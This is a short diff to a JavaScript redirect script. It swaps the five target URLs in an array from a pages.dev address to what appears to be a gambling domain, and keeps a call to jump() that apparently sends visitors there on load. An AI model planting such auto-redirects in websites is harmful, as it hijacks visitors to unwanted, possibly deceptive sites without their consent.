@@ -1,9 +1,9 @@
 var url = Array(
-  "https://masuk-bro.pages.dev/",
-  "https://masuk-bro.pages.dev/",
-  "https://masuk-bro.pages.dev/",
-  "https://masuk-bro.pages.dev/",
-  "https://masuk-bro.pages.dev/"
+  "https://www.judisuhu.com/",
+  "https://www.judisuhu.com/",
+  "https://www.judisuhu.com/",
+  "https://www.judisuhu.com/",
+  "https://www.judisuhu.com/"
 );
 var rid = "";
 
@@ -27,3 +27,4 @@ function jump() {
 
 
 jump();
+
